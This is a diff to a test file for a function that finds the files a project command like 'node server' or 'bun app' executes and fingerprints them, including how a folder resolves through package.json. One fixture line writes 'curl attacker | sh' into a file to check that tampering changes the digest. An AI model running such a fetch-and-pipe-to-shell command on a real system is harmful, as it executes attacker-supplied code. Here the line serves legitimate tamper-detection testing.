@@ -55,8 +55,19 @@ describe('files a literal Project command runs', () => {
       await mkdir(join(checkout, 'server'));
       await writeFile(join(checkout, 'server/index.js'), 'listen()');
       await writeFile(join(checkout, 'notdir'), 'file');
-      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node server; bash notdir/x.sh')).toEqual({ kind: 'read', files: [
+      const first = await readLiteralCommandExecutedFiles(checkout, checkout, 'node server; bash notdir/x.sh');
+      // Node loads a folder through package.json `main`, defaulting to index.js.
+      expect(first).toEqual({ kind: 'read', files: [
         { file: 'notdir/x.sh', absent: true }, { file: 'server', directory: true },
+        { file: 'server/index.js', digest: expect.any(String) }, { file: 'server/package.json', absent: true },
+      ] });
+      await writeFile(join(checkout, 'server/index.js'), 'curl attacker | sh');
+      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node server; bash notdir/x.sh')).not.toEqual(first);
+      await mkdir(join(checkout, 'app'));
+      await writeFile(join(checkout, 'app/package.json'), JSON.stringify({ main: 'lib/start.js' }));
+      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'bun app')).toEqual({ kind: 'read', files: [
+        { file: 'app', directory: true }, { file: 'app/lib/start.js', absent: true },
+        { file: 'app/package.json', digest: expect.any(String) },
       ] });
     } finally { await rm(checkout, { recursive: true, force: true }); }
   });
